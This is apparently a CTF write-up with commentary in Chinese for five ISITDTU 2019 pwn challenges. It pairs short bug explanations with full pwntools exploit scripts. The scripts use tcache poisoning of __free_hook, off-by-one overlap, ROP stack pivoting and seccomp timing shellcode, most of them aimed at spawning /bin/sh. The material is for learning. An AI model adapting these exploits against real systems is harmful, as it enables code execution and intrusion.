## Pwn

### iz_heap_lv1

```
// file
iz_heap_lv1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03331a270efbb8a9456c60ae90f44cb384028f76, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/iz_heap_lv1/iz_heap_lv1/iz_heap_lv1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

glibc 2.27。



由於 array 的 index check 沒有寫好，導致 list 中有一個 pointer 是可以控制，因此透過控制 pointer + no PIE，可以 `free` 任意大小的 chunk，並且如果 chunk 是在可控範圍，也能修改 freed chunk (UAF)，搭配 glibc 2.27 tcache 檢查機制薄弱，最後寫 `__free_hook` 即可 exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process("./I", env={"LD_PRELOAD": "./libc.so.6"})
gdb.attach(r, """
b *0x400b01
c
""")


"""
1. Add
2. Edit
3. Delete
4. Show
5. Exit
"""

def add(sz, ct):
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('Enter size: ', str(sz))
    r.sendafter('Enter data: ', ct)

def edit(idx, sz, ct):
    r.sendlineafter('Choice: ', '2')
    r.sendlineafter('Enter index: ', str(idx))
    r.sendlineafter('Enter size: ', str(sz))
    r.sendafter('Enter data: ', str(ct))

def delete(idx):
    r.sendlineafter('Choice: ', '3')
    r.sendlineafter('Enter index: ', str(idx))

def show(name=''):
    edit = True if name != '' else False

    r.sendlineafter('Choice: ', '4')
    r.sendafter('DO you want to edit: (Y/N)', 'Y' if edit else 'N')
    if edit:
        r.sendafter('Input name: ', name)

l = 0x602060
name = 0x602100
stderr = 0x602040
info(f"""
list: {hex(l)}
name: {hex(name)}
""")

## leak heap ##
pl = p64(0x602110) + p64(0x21) + p64(0x602020)
r.sendafter('Input name: ', pl)
add(0x20, str(0))
edit(20, 0x20, 'meow')
show()
r.recvuntil('Name: ')
heap = u64(r.recvline()[:-1].ljust(8, b'\x00'))
info(f"""
heap: {hex(heap)}
""")

## leak libc ##
pl = p64(0) + p64(0x21) + p64(stderr) # modify tcache fd
show(pl)
add(0x10, 'A')
add(0x10, 'B')
show(p64(0))
edit(20, 0x10, 'C')
show()
r.recvuntil('Name: ')
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x3ec680
__free_hook = libc + 0x3ed8e8
_system = libc + 0x4f440
info(f"""
libc: {hex(libc)}
""")

## exploit ##
pl = p64(0x602110) + p64(0x41) + p64(0)
show(pl)
edit(20, 0x40, 'D')
pl = p64(0) + p64(0x41) + p64(__free_hook)
show(pl)
add(0x30, 'E')
add(0x30, p64(_system))
show(p64(name + 8) + b"/bin/sh\x00")
delete(20)

r.interactive()
```

- 如果在 `malloc()` 之前就已經 `free()`，則不會有 tcache struct



### iz_heap_lv2

```
// file
iz_heap_lv2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b02ab240b561964f41c82d1ff84f51fc5f9c859e, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/iz_heap_lv2/iz_heap_lv2/iz_heap_lv2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

glibc 2.27。



1. 用 tcache 殘留下的 fd 來 leak heap address
2. 用 unsorted bin consolidation 過後留下的 pointer 取得 libc address
3. 用 off-by-one + unlink 與 tcache chunk overlap
4. glibc 2.27 直接改 tcache fd 為 `__free_hook` 即可

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process("./I", env={"LD_PRELOAD": "./libc.so.6"})
gdb.attach(r, """
""")

"""
1. Add
2. Edit
3. Delete
4. Show
5. Exit
"""

def add(sz, ct):
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('Enter size: ', str(sz))
    r.sendafter('Enter data: ', ct)

def edit(idx, ct):
    r.sendlineafter('Choice: ', '2')
    r.sendafter('Enter data: ', str(ct))

def delete(idx):
    r.sendlineafter('Choice: ', '3')
    r.sendlineafter('Enter index: ', str(idx))

def show(idx):
    r.sendlineafter('Choice: ', '4')
    r.sendlineafter('Enter index: ', str(idx))

l = 0x602040
chk_sz = 0x6020E0
info(f"""
list: {hex(l)}
chk_sz: {hex(chk_sz)}
""")

### leak heap ###
add(0xf7, 'leak heap')
add(0xf7, 'leak heap')
delete(0)
delete(1)
add(0xf7, 'A')
show(0)
r.recvuntil('Data: ', )
heap = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x241
info(f"""
heap: {hex(heap)}
""")
delete(0)

### leak libc ###
for i in range(0x7): # 0 ~ 6
    add(0xf7, 'fill tcache')

add(0xf7, 'chunk for consolidation') # 7
add(0xf7, 'chunk for consolidation') # 8
add(0xf7, 'victim') # 9
add(0x17, 'meow') # 10, prevent consolidation

for i in range(0x7):
    delete(i)

delete(8)
delete(7)
add(0x37, 'A') # 0
show(0)
r.recvuntil('Data: ', )
libc = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x3ebe41
__free_hook = libc + 0x3ed8e8
_system = libc + 0x4f440
info(f"""
libc: {hex(libc)}
""")

### exploit ###
add(0xe7, '/bin/sh') # 1 --> for free("/bin/sh")
add(0x37, p64(0) * 3 + p64(0xb0) + p64(heap + 0xaa0) * 2) # 2
add(0x37, 'victim 2') # 3
add(0x48, p64(0)*8 + p64(0xb0)) # 4
delete(2)
delete(3)
delete(9) # overlap with victim 2
add(0x57, p64(0)*3 + p64(0x41) + p64(__free_hook))
add(0x37, 'meow')
add(0x37, p64(_system)) # write __free_hook
delete(1)

r.interactive()
```



### babyshellcode

```
// file
./babyshellcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fd78179569f7247548de4272dfd337d6c17e4452, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/babyshellcode/babyshellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程式一開始會讀取 `/flag`，並且將資料寫入 `mmap` 出來的 `0xCAFE000`，然後從 `/dev/urandom` 讀取 8 bytes random number 與 flag 做 xor。

而在之後會讀取 70 bytes 的 shellcode，並且為執行流程加 seccomp，seccomp rule 規定除了 `alarm` 之外的 syscall 其他都不能用:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x00 0x01 0x00000025  if (A != alarm) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

而且在執行 shellcode 之前有一段固定的 shellcode 會把除了 RIP 以外的 register 清為 0。



首先，因為 flag 的前 8 bytes prefix 是已知的 `ISITDTU{`，因此基本上能夠簡單的將 flag 還原，但是該怎麼把 flag 讀出來? 能使用 alarm 的情況下，應該是只能透過 while loop + alarm timeout 的時間來判斷該字元，因此透過想辦法找出 xor 後讓 alarm timeout 為 1 的 byte，就能找出當前的 byte:

```python
#!/usr/bin/python3

from pwn import *
import string

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

wl = string.ascii_letters + string.digits + "!@+-_?{}"
wl = wl.encode()

flag = b'ISITDTU{'
mmap = 0xCAFE000
for i in range(8, 0x31):
    for w in wl:
        w = w ^ 0x1
        r = process("./babyshellcode", env={"LD_LIBRARY_PATH": "."}, aslr=False)
        sc = asm(f"""
        mov rsi, {mmap}
        mov rdx, 0x7b55544454495349
        xor rdx, qword ptr [rsi]

        mov rdi, 0xff
        shl rdi, {8 * (i % 4)}
        and rdx, rdi
        shr rdx, {8 * (i % 4)}
        xor dl, byte ptr [esi + {i}]
        xor dl, {w}
        mov rdi, rdx
        mov rax, 37
        syscall
        loop:
        jmp loop
        """)
        assert (len(sc) < 0x46)
        r.send(sc)
        try:
            sleep(0.3)
            r.recv(timeout=1)
        except EOFError:
            flag += bytes([w ^ 0x1])
            r.close()
            break
        except KeyboardInterrupt:
            exit()
        r.close()
    print(flag)
```



### Tokenizer

```
// file
tokenizer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d6d2efdaea33704f6b856448518e5ec08736c50d, for GNU/Linux 3.2.0, stripped

// checksec
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/Tokenizer/tokenizer'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



這題出的很妙，由於 `strncpy()` 不會 copy null byte，因此可以在一開始 leak saved_rbp (stack address)，而由於與 input 相連 (同個 string)，因此也會受 `strsep()` replace null byte 所影響，如果將 save_rbp 的最後一個 byte 改為 null byte，`leave ; ret` 就會受到影響而改變 rsp，如果運氣好，rsp 就會在 input buffer 的範圍中，因此能控制 ROP。而 address 前面有 null byte 的話也可以透過 delim 去 replace 成 null byte，這樣就能產生正常的 address。

不過因為沒有 libc address 或是 `syscall` 可以使用，因此先 leak libc + 跳回 `main()`，leak 的方式為 `ostream_plt(cout, alarm_got)`，會在第二次 `main()` 執行 `cout << "Please input string ..."` 時印出 `alarm()` address。而第二次只需要透過一樣的方式執行 `system("/bin/sh")`，不過因為 stack 偏掉，因此 offset 以及 delim 都跟第一次 `main()` 不一樣，需要調整一下，最後透過 stack pivoting + ROP 成功 exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

buf = 0x404260
delims = 0x404280
ostream_plt = 0x401080
cout = 0x404020
alarm_got = 0x403fd8
_main = 0x40133c

pop_rdi_ret = 0x40149b
pop_rsi_r15_ret = 0x401499
leave_ret = 0x40125f
ret = 0x401016

info(f"""
buf: {hex(buf)}
delims: {hex(delims)}
""")

while True:
    r = process("./T", env={"LD_PRELOAD": "./libc-2.27.so"})
    # gdb.attach(r, """
    # b *0x40125E
    # """)

    """
    brute force sample:
    - saved_rbp: 0x7ffc6d0abad0
    - dest: 0x7ffc6d0ab6b0

    Write ROP to 0x7ffc6d0aba00, and fill null byte with delim.
    """

    ## leak libc ##
    rop = b''
    rop += p64(pop_rdi_ret | 0xd0d0d0d0d0000000)
    rop += p64(cout | 0xd0d0d0d0d0000000)
    rop += p64(pop_rsi_r15_ret | 0xd0d0d0d0d0000000)
    rop += p64(alarm_got | 0xd0d0d0d0d0000000)
    rop += p64(0xd0d0d0d0d0d0d0d0)
    rop += p64(ostream_plt | 0xd0d0d0d0d0000000)
    rop += p64(_main | 0xd0d0d0d0d0000000)
    pl = (b'\xaa' * 0x358 + rop).ljust(0x400, b'\xaa')

    r.sendlineafter('Please input string (will be truncated to 1024 characters): ', pl)
    r.recvuntil(pl)
    saved_rbp = u64(r.recv(6).ljust(8, b'\x00'))
    if saved_rbp & 0xff != 0xd0:
        r.close()
        continue
    info(f"""
    saved_rbp: {hex(saved_rbp)}
    dest: {hex(saved_rbp - 0x000420)}
    """)

    r.sendlineafter('Please input delimiters: ', b'\xd0')
    data = r.recvuntil('Welcome')
    libc = u64(data[-6 - len('Welcome'): 0 - len('Welcome')].ljust(8, b'\x00')) - 0xe4840
    _system = libc + 0x4f440
    binsh = libc + 0x1b3e9a
    info(f"""
    libc: {hex(libc)}
    """)

    ## exploit ##
    new_rsp = saved_rbp - 0x1c0
    rop = b'\xaa' * 0x300
    rop += p64(ret | 0x3838383838000000)
    rop += p64(pop_rdi_ret | 0x3838383838000000)
    rop += p64(binsh | 0x3838000000000000)
    rop += p64(_system | 0x3838000000000000)
    rop = rop.ljust(0x3e8, b'\xaa')
    pl = (rop + p64(new_rsp | 0x3838000000000000) + p64(leave_ret | 0x3838383838000000)).ljust(0x400, b'\xaa')

    r.sendlineafter('Please input string (will be truncated to 1024 characters): ', pl)
    r.recvuntil(pl)
    r.sendlineafter('Please input delimiters: ', b'\x38')
    r.interactive()
    break
```



### prisonbreak

```
// file
./prisonbreak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped

// checksec
$ checksec ./prisonbreak  
[*] '/home/u1f383/tmp/pwn/ISITDTU-CTF-2019/Quals/Pwn/prisonbreak/prisonbreak/prisonbreak'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
```

程式只有簡單的幾行 assembly，並且讀 0xc0 大小的 shellcode，不過每 6 bytes 會被 replace 成 assembly `int3`  (`\xcc`)，一共 13 次:

```assembly
mov     rsi, rsp
xor     rax, rax
xor     rdi, rdi        ; fd
mov     rdx, 0C0h       ; count
syscall
mov     rcx, 5

loop:
mov     byte ptr [rsi+rcx], 0CCh
add     rcx, 6
cmp     rcx, 50h ; 'P'
jb      short loop
call    rsi
```

不過重點是 python backend 的 utf-8 檢測，可是我做到最後才發現:

```python
payload = input()[:0xc0].encode('utf-8', 'surrogateescape')
```

shellcode escape 的題目沒什麼問題，不過解起來很麻煩 + 學不太到什麼，所以只附上沒有 utf-8 檢測下的 exploit:

```python
#!/usr/bin/python3

from pwn import *
import string
import time

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

wl = string.ascii_letters + string.digits + "{_@!?}"
wl = wl.encode()
addr = 0x10000000

"""
---- 32 ----
   0:   20 cc                   and    ah, cl
---- 33 ----
   0:   21 cc                   and    esp, ecx
---- 34 ----
   0:   22 cc                   and    cl, ah
---- 35 ----
   0:   23 cc                   and    ecx, esp
---- 36 ----
   0:   24 cc                   and    al, 0xcc

...

---- 48 ----
   0:   30 cc                   xor    ah, cl
---- 49 ----
   0:   31 cc                   xor    esp, ecx
---- 50 ----
   0:   32 cc                   xor    cl, ah
---- 51 ----
   0:   33 cc                   xor    ecx, esp
---- 52 ----
   0:   34 cc                   xor    al, 0xcc
"""

flag = b''

for i in range(0x30):
    for w in wl:
        r = process('./prisonbreak')
        # gdb.attach(r, """
        # b *0x10000027
        # c
        # """)
        pl = asm(f"""
        mov eax, 2
        mov edi, {addr + 0x500}
        mov rcx, 0x6e6c6f636e696c2f
        mov qword ptr [rdi], rcx
        mov rcx, 0x73776f727275625f
        mov qword ptr [rdi + 8], rcx
        xor rsi, rsi
        xor rdx, rdx
        syscall

        mov edi, eax
        xor rax, rax
        mov esi, {addr + 0x500}
        mov rdx, 0x30
        syscall

        mov dl, byte ptr [rsi + {i}]
        cmp dl, {w}
        je loop
        mov eax, 0x3c
        xor rdi, rdi
        syscall
        loop:
        jmp loop
        """)

        sc = b''
        sc += b'\x90' * 4 + b'\x24' # 1
        sc += (b'\x90' * 5 + b'\x24') * 12 # total 13 times
        sc += b'\x90'*0x5
        sc += pl

        r.send(sc)
        f = time.time()
        r.recvall(timeout=1)
        t = time.time()

        if int(t - f) == 1:
            flag += bytes([w])
            r.close()
            break

        r.close()

    print(flag)
```

